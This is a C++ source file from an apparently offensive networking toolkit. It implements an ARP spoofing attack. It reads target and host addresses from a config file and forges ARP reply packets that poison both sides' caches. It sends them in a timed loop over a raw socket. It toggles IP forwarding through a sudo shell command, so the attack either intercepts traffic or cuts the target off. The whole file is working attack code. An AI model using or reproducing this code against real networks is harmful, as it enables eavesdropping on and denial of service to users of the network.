#include "IHackerAttack.h"
#include "HackerARP.h"
#include "JsonConfHandler.h"
#include "HackerUtils.h"
#include "LogHandler.h"
#include "DecoderLayer.h"

#include <iostream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

namespace RAChacker
{
    HackerARP::HackerARP() : uPacketSize(0)
    {
	bzero(cPacket[0], sizeof(cPacket[0]));
	bzero(cPacket[1], sizeof(cPacket[1]));
	targetIP = RACconf::JsonConfHandler::GetValueFromConfigFile<std::string>("arp_spoof.target");
	hostIP = RACconf::JsonConfHandler::GetValueFromConfigFile<std::string>("arp_spoof.host");
	bBothSide = RACconf::JsonConfHandler::GetValueFromConfigFile<bool>("arp_spoof.both");
	bDos = RACconf::JsonConfHandler::GetValueFromConfigFile<bool>("arp_spoof.dos");

	makingAttack();
    }

    void	HackerARP::launchAttack(int socket)
    {
	LOG(INFO, "ARP Spoof starting ...");
	
	ioctl(socket , SIOCGIFINDEX , &ifr);
	sll.sll_ifindex = ifr.ifr_ifindex;

	int i = -1;

	while (i != bBothSide)
	{
	    HackerUtils::loopHandlerAttackTimer([&]() -> void { 
		    while (i != static_cast<int>(bBothSide))
		    {
		    ++i;
		    sendto(socket, cPacket[i], uPacketSize, 0, (struct sockaddr*)&sll, sizeof(struct sockaddr_ll));
		    memcpy(sll.sll_addr, uMacHost, sizeof(uMacHost));

		    RACdecoder::DecoderLayer decoderLayer(cPacket[i]);
		    LOG(DEBUG, "This packet will be sent : " << std::endl << decoderLayer.getProtocolDecoded());
		    }
		    i = -1;
		    memcpy(sll.sll_addr, uMacDest, sizeof(uMacDest));
		    });
	}
    }

    void    HackerARP::makingAttack()
    {
	// ETHERNET
	
	const uint8_t	aEtherType[2] = {0x08, 0x06}; // ARP
	ethernetLayer.setEtherType(aEtherType);

	// ARP

	ARPlayer.setHdwType(hardwareType::ETHERNET << 8);	
	ARPlayer.setProtocolType(htons(etherType::protocol::IPV4));
	ARPlayer.setHdwAddrLength(6);
	ARPlayer.setProtocolAddrLength(4);
	ARPlayer.setOpe(htons(ARPOP_REPLY));
	ARPlayer.setSndrHdwAddr(uMacSrc);
	ARPlayer.setSndrInternetAddr(ntohl((inet_network(hostIP.c_str()))));
	if (targetIP != IPDest)
	{
	    bzero(uMacDest, sizeof(uMacDest));
	    HackerUtils::computeMacFromLocalIP(targetIP, uMacDest);
	}
	ARPlayer.setTgtHdwAddr(uMacDest);
	ARPlayer.setTgtInternetAddr(ntohl((inet_network(targetIP.c_str()))));

	if (bDos)
	{
	    system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward");
	}
	else
	{
	    system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward");
	}

	LOG(INFO, "ip_forward set to : " << bDos);
	memcpy(cPacket[0], ethernetLayer.getProtocol(), ethernetLayer.getStructSize());
	memcpy(cPacket[0] + ethernetLayer.getStructSize(), ARPlayer.getProtocol(), ARPlayer.getStructSize());
	uPacketSize = ethernetLayer.getStructSize() + ARPlayer.getStructSize();

	{
	    strncpy((char *)ifr.ifr_name, interface.c_str(), interface.length());
	    bzero(&sll , sizeof(sll));

	    sll.sll_family = AF_PACKET;
	    sll.sll_protocol = htons(ETH_P_ARP);
	    sll.sll_hatype = htons(ARPHRD_ETHER);
	    sll.sll_pkttype = (PACKET_BROADCAST);
	    sll.sll_halen =  6;
	    sll.sll_addr[6] = 0x00;
	    sll.sll_addr[7] = 0x00;
	    memcpy(sll.sll_addr, uMacDest, sizeof(uMacDest));
	}
	if (bBothSide)
	{
	    LOG(INFO, "Attack will be sent on both side (Host & target)");	    

	    HackerUtils::computeMacFromLocalIP(hostIP, uMacHost);

	    ethernetLayer.setDestMAC(uMacHost);
	    //ethernetLayer.setSrcMAC(uMacDest);

	    ARPlayer.setSndrInternetAddr(ntohl((inet_network(targetIP.c_str()))));
	    ARPlayer.setTgtHdwAddr(uMacHost);
	    ARPlayer.setTgtInternetAddr(ntohl((inet_network(hostIP.c_str()))));
	    memcpy(cPacket[1], ethernetLayer.getProtocol(), ethernetLayer.getStructSize());
	    memcpy(cPacket[1] + ethernetLayer.getStructSize(), ARPlayer.getProtocol(), ARPlayer.getStructSize());
	}
    }
}
